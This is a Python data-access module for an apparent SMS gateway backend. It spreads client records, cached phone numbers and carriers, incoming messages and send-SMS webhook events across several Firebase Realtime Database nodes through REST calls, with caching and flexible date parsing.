# app/crud/firebase_crud.py
from typing import Dict, Any, List, Optional
# pyrefly: ignore [missing-import]
from app.core.config import get_settings
import httpx
import logging
from concurrent.futures import ThreadPoolExecutor
import time

logger = logging.getLogger(__name__)
settings = get_settings()

# Multi-Node Firebase Setup
FIREBASE_NODES = settings.get_firebase_nodes()

# In-Memory Routing Map: client_id -> node_dict
CLIENT_NODE_MAP: Dict[str, Dict[str, str]] = {}

# ThreadPoolExecutor for concurrent parallel database requests
_CRUD_EXECUTOR = ThreadPoolExecutor(max_workers=16)

def _firebase_request_node(node: Dict[str, str], method: str, path: str, json_data: dict = {}, params: str = "") -> Any:
    """Execute HTTP REST request to a specific Firebase node."""
    url = f"{node['url']}{path}.json?auth={node['auth']}{params}"
    try:
        with httpx.Client(timeout=15.0) as client:
            if method.upper() == 'GET':
                resp = client.get(url)
            elif method.upper() == 'PUT':
                resp = client.put(url, json=json_data)
            elif method.upper() == 'PATCH':
                resp = client.patch(url, json=json_data)
            elif method.upper() == 'POST':
                resp = client.post(url, json=json_data)
            elif method.upper() == 'DELETE':
                resp = client.delete(url)
            else:
                raise ValueError(f"Unsupported method {method}")
                
            resp.raise_for_status()
            return resp.json()
    except Exception as exc:
        logger.error(f"Firebase [{node['id']}] API Error on {method} {path}: {exc}")
        return None

import re
from datetime import datetime

def parse_any_datetime_to_epoch_ms(val: Any) -> float:
    """
    Parses any datetime representation (numeric epoch, ISO string, '06-12-2025 | 06:55 PM', 
    '02-08-2026 | 06:48 PM', '06-Aug-2026 20:21', etc.) into Unix epoch milliseconds.
    """
    if val is None or val == "" or val == 0:
        return 0.0

    # If a dict is passed (e.g. the full message or status object)
    if isinstance(val, dict):
        # 1. Check numeric timestamp/time/createdAt
        raw_ts = val.get("timestamp") or val.get("time") or val.get("createdAt")
        parsed_num = parse_any_datetime_to_epoch_ms(raw_ts)
        if parsed_num > 946684800000:  # After year 2000
            return parsed_num

        # 2. Check dateTime / date_time / date
        raw_dt = val.get("dateTime") or val.get("datetime") or val.get("date_time") or val.get("date")
        if raw_dt:
            parsed_dt = parse_any_datetime_to_epoch_ms(raw_dt)
            if parsed_dt > 0:
                return parsed_dt

        return 0.0

    # 1. Numeric epoch (ms or sec)
    if isinstance(val, (int, float)):
        num = float(val)
        if num <= 0:
            return 0.0
        # If it's in seconds (e.g. 1.7e9), convert to ms
        if num < 1e11:
            return num * 1000.0
        return num

    # 2. String representation
    s = str(val).strip()
    if not s:
        return 0.0

    # Numeric string (e.g. "1786114347895" or "1786114347")
    if s.replace(".", "", 1).isdigit():
        try:
            num = float(s)
            if num <= 0:
                return 0.0
            if num < 1e11:
                return num * 1000.0
            return num
        except Exception:
            pass

    # Clean separators (e.g. "06-12-2025 | 06:55 PM" -> "06-12-2025 06:55 PM")
    cleaned = s.replace("|", " ").replace("/", "-").strip()
    cleaned = re.sub(r"\s+", " ", cleaned).upper()

    # Candidate date parsing formats
    date_formats = [
        "%d-%m-%Y %I:%M %p",       # "06-12-2025 06:55 PM" or "02-08-2026 06:48 PM"
        "%d-%m-%Y %I:%M:%S %p",
        "%d-%m-%Y %H:%M:%S",       # "06-12-2025 18:55:00"
        "%d-%m-%Y %H:%M",          # "06-12-2025 18:55"
        "%m-%d-%Y %I:%M %p",       # "12-06-2025 06:55 PM"
        "%m-%d-%Y %I:%M:%S %p",
        "%m-%d-%Y %H:%M:%S",
        "%m-%d-%Y %H:%M",
        "%Y-%m-%d %H:%M:%S",       # "2026-08-02 18:48:00"
        "%Y-%m-%d %I:%M %p",       # "2026-08-02 06:48 PM"
        "%Y-%m-%d %H:%M",
        "%d-%b-%Y %H:%M",          # "06-Aug-2026 20:21"
        "%d-%b-%y %H:%M",          # "06-Aug-26 20:21"
        "%d-%b-%Y %I:%M %p",
        "%d-%b-%y %I:%M %p",
        "%d-%B-%Y %H:%M",
        "%Y-%m-%dT%H:%M:%S.%fZ",   # ISO format
        "%Y-%m-%dT%H:%M:%SZ",
        "%Y-%m-%dT%H:%M:%S",
    ]

    for fmt in date_formats:
        try:
            dt = datetime.strptime(cleaned, fmt)
            return dt.timestamp() * 1000.0
        except Exception:
            continue

    return 0.0

def _find_client_node(client_id: str) -> Optional[Dict[str, str]]:
    """Locate owning node for a client_id across all configured Firebase instances."""
    if client_id in CLIENT_NODE_MAP:
        return CLIENT_NODE_MAP[client_id]

    def probe(node):
        # Probe /clients/, /gateways/, AND /messages/ paths (SilentGate + Legacy)
        res = _firebase_request_node(node, 'GET', f'/clients/{client_id}')
        if res:
            return node
        res_gw = _firebase_request_node(node, 'GET', f'/gateways/{client_id}')
        if res_gw:
            return node
        res_msgs = _firebase_request_node(node, 'GET', f'/messages/{client_id}', params="&shallow=true")
        if res_msgs:
            return node
        return None

    futures = [_CRUD_EXECUTOR.submit(probe, n) for n in FIREBASE_NODES]
    for fut in futures:
        found_node = fut.result()
        if found_node:
            CLIENT_NODE_MAP[client_id] = found_node
            return found_node

    # Default to first node if unmapped
    return FIREBASE_NODES[0] if FIREBASE_NODES else None

import os
import json

# ---- Universal Aggregated Reads & Writes ----
CACHE_FILE_PATH = os.path.join(os.path.dirname(os.path.dirname(__file__)), "data", "phone_cache.json")
REDIS_PHONE_CACHE_KEY = "nexsms:phone_cache"
GLOBAL_PHONE_CACHE: Dict[str, Dict[str, Any]] = {}

def _load_phone_cache() -> Dict[str, Dict[str, Any]]:
    """Load persistent phone cache from local JSON file."""
    global GLOBAL_PHONE_CACHE
    if GLOBAL_PHONE_CACHE:
        return GLOBAL_PHONE_CACHE
    try:
        if os.path.exists(CACHE_FILE_PATH):
            with open(CACHE_FILE_PATH, "r", encoding="utf-8") as f:
                GLOBAL_PHONE_CACHE = json.load(f)
                logger.info(f"[PhoneCache] Loaded {len(GLOBAL_PHONE_CACHE)} cached device phone numbers from JSON file.")
    except Exception as e:
        logger.warning(f"[PhoneCache] Failed to load JSON phone cache: {e}")
    return GLOBAL_PHONE_CACHE

import threading
_PHONE_CACHE_LOCK = threading.Lock()

def _save_phone_cache(updated_entries: Optional[Dict[str, Dict[str, Any]]] = None) -> None:
    """
    Saves in-memory phone cache to local JSON file AND syncs to Redis Hash nexsms:phone_cache.
    Atomic multi-layer persistence for zero lock contention and 0ms reads.
    """
    # 1. Save to disk (JSON file backup)
    try:
        dir_path = os.path.dirname(CACHE_FILE_PATH)
        os.makedirs(dir_path, exist_ok=True)
        temp_path = f"{CACHE_FILE_PATH}.{threading.get_ident()}.tmp"
        
        with _PHONE_CACHE_LOCK:
            cache_snapshot = dict(GLOBAL_PHONE_CACHE)
            
        with open(temp_path, "w", encoding="utf-8") as f:
            json.dump(cache_snapshot, f, indent=2)
        try:
            os.replace(temp_path, CACHE_FILE_PATH)
        except Exception:
            with open(CACHE_FILE_PATH, "w", encoding="utf-8") as f:
                json.dump(cache_snapshot, f, indent=2)
            if os.path.exists(temp_path):
                try:
                    os.remove(temp_path)
                except Exception:
                    pass
    except Exception as e:
        logger.warning(f"[PhoneCache] Failed to save JSON phone cache: {e}")

    # 2. Async/Threaded Push to Redis Hash for multi-process sharing
    if updated_entries:
        try:
            import asyncio
            async def _push_to_redis():
                try:
                    # pyrefly: ignore [missing-import]
                    from utils.redis_manager import redis_manager
                    client = await redis_manager.get_client()
                    if client:
                        pipe = client.pipeline()
                        for cid, data in updated_entries.items():
                            pipe.hset(REDIS_PHONE_CACHE_KEY, cid, json.dumps(data))
                        await pipe.execute()
                except Exception as ex:
                    logger.debug(f"[PhoneCache] Redis sync background notice: {ex}")

            try:
                loop = asyncio.get_running_loop()
                if loop.is_running():
                    asyncio.create_task(_push_to_redis())
            except RuntimeError:
                pass
        except Exception:
            pass

# In-memory TTL caches for multi-node Firebase aggregation
_CLIENTS_CACHE: Dict[str, Any] = {}
_CLIENTS_CACHE_TIME: float = 0.0
_SIM_NODES_CACHE: List[Any] = []
_SIM_NODES_CACHE_TIME: float = 0.0
_CACHE_TTL_SECONDS: float = 15.0


def get_all_clients(force_refresh: bool = False) -> Dict[str, Any]:
    """
    Fetch clients from all configured Firebase RTDB nodes concurrently with 15s TTL caching.
    Merges all client dictionaries into a single master map {clientId: clientData}
    and registers client-to-node routing mappings.
    Applies persistent GLOBAL_PHONE_CACHE for instant 0ms number & network resolution.
    """
    global _CLIENTS_CACHE, _CLIENTS_CACHE_TIME
    now = time.time()
    if not force_refresh and _CLIENTS_CACHE and (now - _CLIENTS_CACHE_TIME < _CACHE_TTL_SECONDS):
        return _CLIENTS_CACHE

    cache_updated = False
    updated_entries: Dict[str, Dict[str, Any]] = {}
    aggregated_clients: Dict[str, Any] = {}

    def fetch_node(node):
        res = _firebase_request_node(node, 'GET', '/clients')
        if isinstance(res, dict):
            return node, res
        return node, {}

    futures = [_CRUD_EXECUTOR.submit(fetch_node, n) for n in FIREBASE_NODES]
    for fut in futures:
        node, clients_dict = fut.result()
        for cid, cdata in clients_dict.items():
            if isinstance(cdata, dict):
                cdata["firebase_id"] = node["id"]
                cdata["firebaseId"] = node["id"]

                # Extract phone & network from root, SIMs, smsAnalysis, or memory cache
                phone = cdata.get("mobNo") or cdata.get("phoneNumber") or cdata.get("number")
                network = cdata.get("service_provider") or cdata.get("network") or cdata.get("operator")

                # Fallback 1: SIMs array
                if not phone or not network:
                    sims = cdata.get("sims", [])
                    if isinstance(sims, list) and sims and isinstance(sims[0], dict):
                        if not phone:
                            phone = sims[0].get("phoneNumber") or sims[0].get("number") or sims[0].get("mobNo")
                        if not network:
                            network = sims[0].get("carrierName") or sims[0].get("carrier") or sims[0].get("operator") or sims[0].get("service_provider") or sims[0].get("network")

                # Fallback 2: smsAnalysis
                if not phone or not network:
                    sms_analysis = cdata.get("smsAnalysis", {})
                    if isinstance(sms_analysis, dict):
                        if not phone and sms_analysis.get("phoneNumbers"):
                            phone = sms_analysis["phoneNumbers"][0]
                        if not network and sms_analysis.get("networks"):
                            network = sms_analysis["networks"][0]

                # Fallback 3: In-Memory Cache
                if not phone or not network:
                    if cid in GLOBAL_PHONE_CACHE:
                        cached = GLOBAL_PHONE_CACHE[cid]
                        if not phone:
                            phone = cached.get("mobNo")
                        if not network:
                            network = cached.get("service_provider")

                # Format phone with +91 uniformly
                if phone:
                    clean_p = str(phone).strip().replace(" ", "").replace("-", "")
                    if not clean_p.startswith("+"):
                        if len(clean_p) == 10 and clean_p[0] in "6789":
                            phone = f"+91{clean_p}"
                        elif clean_p.startswith("91") and len(clean_p) == 12:
                            phone = f"+{clean_p}"

                # Inject promoted fields into root cdata & update global cache
                if phone:
                    cdata["mobNo"] = phone
                    cdata["phoneNumber"] = phone
                if network:
                    cdata["service_provider"] = network
                    cdata["operator"] = network

                if phone or network:
                    old_entry = GLOBAL_PHONE_CACHE.get(cid)
                    new_entry = {"mobNo": phone, "service_provider": network}
                    if old_entry != new_entry:
                        GLOBAL_PHONE_CACHE[cid] = new_entry
                        updated_entries[cid] = new_entry
                        cache_updated = True

                aggregated_clients[cid] = cdata
                CLIENT_NODE_MAP[cid] = node

    if cache_updated:
        _save_phone_cache(updated_entries)

    _CLIENTS_CACHE = aggregated_clients
    _CLIENTS_CACHE_TIME = now
    return aggregated_clients


async def get_all_sim_nodes_async(force_refresh: bool = False) -> List[Any]:
    """
    Async Universal Multi-Schema Aggregator with 15s TTL Caching:
    Queries all declared Firebase nodes via UniversalFirebaseRegistry.
    """
    global _SIM_NODES_CACHE, _SIM_NODES_CACHE_TIME
    now = time.time()
    if not force_refresh and _SIM_NODES_CACHE and (now - _SIM_NODES_CACHE_TIME < _CACHE_TTL_SECONDS):
        return _SIM_NODES_CACHE

    # pyrefly: ignore [missing-import]
    from app.crud.universal_firebase import UniversalFirebaseRegistry
    sim_nodes = await UniversalFirebaseRegistry.fetch_all_sim_nodes_async()
    _SIM_NODES_CACHE = sim_nodes
    _SIM_NODES_CACHE_TIME = now
    logger.info(f"[SchemaAdapter] Aggregated {len(sim_nodes)} valid allocatable SIM nodes across Universal Firebase Registry")
    return sim_nodes


def get_all_sim_nodes(force_refresh: bool = False) -> List[Any]:
    """
    Universal Multi-Schema Aggregator with 15s TTL Caching (Sync Fallback):
    """
    global _SIM_NODES_CACHE, _SIM_NODES_CACHE_TIME
    now = time.time()
    if not force_refresh and _SIM_NODES_CACHE and (now - _SIM_NODES_CACHE_TIME < _CACHE_TTL_SECONDS):
        return _SIM_NODES_CACHE

    # pyrefly: ignore [missing-import]
    from app.crud.universal_firebase import UniversalFirebaseRegistry
    sim_nodes = UniversalFirebaseRegistry.fetch_all_sim_nodes()
    _SIM_NODES_CACHE = sim_nodes
    _SIM_NODES_CACHE_TIME = now
    logger.info(f"[SchemaAdapter] Aggregated {len(sim_nodes)} valid allocatable SIM nodes across Universal Firebase Registry")
    return sim_nodes


def get_client(client_id: str) -> Optional[Dict[str, Any]]:
    """Get single client data from its owning Firebase node."""
    node = _find_client_node(client_id)
    if not node:
        return None
    res = _firebase_request_node(node, 'GET', f'/clients/{client_id}')
    if res and isinstance(res, dict):
        res["firebase_id"] = node["id"]
        res["firebaseId"] = node["id"]
        CLIENT_NODE_MAP[client_id] = node
        return res
    return None

def update_client(client_id: str, data: Dict[str, Any]) -> None:
    """Update client fields on its owning Firebase node."""
    node = _find_client_node(client_id)
    if node:
        _firebase_request_node(node, 'PATCH', f'/clients/{client_id}', json_data=data)

def set_webhook_event(client_id: str, command_data: Dict[str, Any]) -> None:
    """Set webhookEvent.sendSms for a client on its owning Firebase node."""
    node = _find_client_node(client_id)
    if node:
        _firebase_request_node(node, 'PUT', f'/clients/{client_id}/webhookEvent', json_data=command_data)

def get_webhook_event(client_id: str) -> Optional[Dict[str, Any]]:
    node = _find_client_node(client_id)
    if node:
        return _firebase_request_node(node, 'GET', f'/clients/{client_id}/webhookEvent')
    return None

def clear_webhook_event(client_id: str) -> None:
    node = _find_client_node(client_id)
    if node:
        _firebase_request_node(node, 'DELETE', f'/clients/{client_id}/webhookEvent')

def get_incoming_messages(client_id: str, limit: int = 150) -> List[Dict[str, Any]]:
    """
    Get last 'limit' incoming messages for a device/client across all configured Firebase RTDB nodes.
    Applies multi-identifier key resolution (deviceId, firebaseNodeId, phoneNumber) and deep datetime parsing.
    Uses limitToLast only (no orderBy=$key which requires Firebase index rules).
    """
    if not client_id:
        return []

    # 1. Resolve candidate RTDB keys for this client_id
    candidate_keys = [client_id]
    
    # Add phone number variants as candidate keys from phone cache
    if client_id in GLOBAL_PHONE_CACHE:
        cached_phone = GLOBAL_PHONE_CACHE[client_id].get("mobNo", "")
        if cached_phone and cached_phone not in candidate_keys:
            candidate_keys.append(cached_phone)
            clean_digits = cached_phone.replace("+", "")
            if clean_digits and clean_digits not in candidate_keys:
                candidate_keys.append(clean_digits)
    
    # Check if client_id maps to any known SIM node in memory
    try:
        sim_nodes = get_all_sim_nodes()
        for sn in sim_nodes:
            if client_id in (sn.device_id, sn.phone_number, getattr(sn, 'clean_digits', '')):
                for k in (sn.device_id, sn.phone_number):
                    if k and k not in candidate_keys and not k.startswith("node_"):
                        candidate_keys.append(k)
                # Also add clean digits variant
                clean = getattr(sn, 'clean_digits', '')
                if clean and clean not in candidate_keys:
                    candidate_keys.append(clean)
    except Exception as e:
        logger.debug(f"[get_incoming_messages] Candidate key mapping notice: {e}")

    # Ensure no node name like 'node_1' is in candidate_keys
    candidate_keys = [k for k in candidate_keys if k and not k.startswith("node_")]

    result = None

    # 2. Try mapped keys first against owning node — uses orderBy="%24key" required by Firebase REST API for limitToLast
    for key in candidate_keys:
        node = _find_client_node(key)
        if node:
            params = f'&orderBy="%24key"&limitToLast={limit}'
            # Check /messages/{key} (SilentGate primary path)
            res = _firebase_request_node(node, 'GET', f'/messages/{key}', params=params)
            if res and isinstance(res, dict):
                result = res
                break
            # Check /clients/{key}/messages (Legacy path)
            res_c = _firebase_request_node(node, 'GET', f'/clients/{key}/messages', params=params)
            if res_c and isinstance(res_c, dict):
                result = res_c
                break
            # Check /gateways/{key}/messages (SilentGate alternate path)
            res_g = _firebase_request_node(node, 'GET', f'/gateways/{key}/messages', params=params)
            if res_g and isinstance(res_g, dict):
                result = res_g
                break
            # Check root /gateways/{key} for embedded 'messages' attribute
            res_root = _firebase_request_node(node, 'GET', f'/gateways/{key}')
            if res_root and isinstance(res_root, dict) and isinstance(res_root.get("messages"), dict):
                result = res_root["messages"]
                break

    # 3. If still empty, probe ALL Firebase nodes concurrently across ALL candidate keys
    if not result or not isinstance(result, dict):
        def probe_messages(n):
            for k in candidate_keys:
                params = f'&orderBy="%24key"&limitToLast={limit}'
                # Primary: /messages/{key}
                res = _firebase_request_node(n, 'GET', f'/messages/{k}', params=params)
                if res and isinstance(res, dict):
                    return n, k, res
                # Fallback 1: /clients/{key}/messages
                res_c = _firebase_request_node(n, 'GET', f'/clients/{k}/messages', params=params)
                if res_c and isinstance(res_c, dict):
                    return n, k, res_c
                # Fallback 2: /gateways/{key}/messages
                res_g = _firebase_request_node(n, 'GET', f'/gateways/{k}/messages', params=params)
                if res_g and isinstance(res_g, dict):
                    return n, k, res_g
            return n, None, None

        futures = [_CRUD_EXECUTOR.submit(probe_messages, n) for n in FIREBASE_NODES]
        for fut in futures:
            found_n, found_k, found_res = fut.result()
            if found_res and isinstance(found_res, dict):
                result = found_res
                CLIENT_NODE_MAP[client_id] = found_n
                if found_k:
                    CLIENT_NODE_MAP[found_k] = found_n
                break

    if not isinstance(result, dict):
        return []

    messages = []
    for key, val in result.items():
        if isinstance(val, dict):
            msg_dict = dict(val)
            msg_dict['id'] = str(msg_dict.get('id') or key)
            
            # Parse timestamp safely to Unix epoch milliseconds
            epoch_ms = parse_any_datetime_to_epoch_ms(msg_dict)
            msg_dict['timestamp'] = epoch_ms
            
            # Ensure dateTime string is populated
            if not msg_dict.get('dateTime'):
                if msg_dict.get('datetime'):
                    msg_dict['dateTime'] = msg_dict['datetime']
                elif msg_dict.get('date_time'):
                    msg_dict['dateTime'] = msg_dict['date_time']
                elif msg_dict.get('date') and msg_dict.get('time'):
                    msg_dict['dateTime'] = f"{msg_dict['date']} | {msg_dict['time']}"

            messages.append(msg_dict)

    messages.sort(
        key=lambda x: (x.get('timestamp') or 0.0, safe_float(x.get('id')) if str(x.get('id', '')).isdigit() else str(x.get('id', ''))),
        reverse=True
    )
    return messages[:limit]

def safe_float(val: Any, default: float = 0.0) -> float:
    try:
        if val is None:
            return default
        return float(val)
    except (ValueError, TypeError):
        return default

def get_client_id_by_phone(phone: str) -> Optional[str]:
    """Lookup clientId by phone number across all Firebase nodes concurrently."""
    def probe(node):
        return _firebase_request_node(node, 'GET', f'/phoneMapping/{phone}')

    futures = [_CRUD_EXECUTOR.submit(probe, n) for n in FIREBASE_NODES]
    for fut in futures:
        cid = fut.result()
        if cid and isinstance(cid, str):
            return cid
    return None

def log_outgoing_message(client_id: str, command_data: Dict[str, Any]) -> None:
    """Append outgoing message log on owning Firebase node."""
    node = _find_client_node(client_id)
    if node:
        _firebase_request_node(node, 'POST', f'/clients/{client_id}/messages', json_data=command_data)

def store_incoming_message(client_id: str, timestamp: int, data: dict):
    """Store incoming message on owning Firebase node."""
    node = _find_client_node(client_id)
    if node:
        _firebase_request_node(node, 'PUT', f"/messages/{client_id}/{timestamp}", json_data=data)

def get_client_sms_analysis(client_id: str) -> Optional[dict]:
    node = _find_client_node(client_id)
    if node:
        return _firebase_request_node(node, 'GET', f"/clients/{client_id}/smsAnalysis")
    return None

def update_client_sms_analysis(client_id: str, data: dict):
    node = _find_client_node(client_id)
    if node:
        _firebase_request_node(node, 'PATCH', f"/clients/{client_id}/smsAnalysis", json_data=data)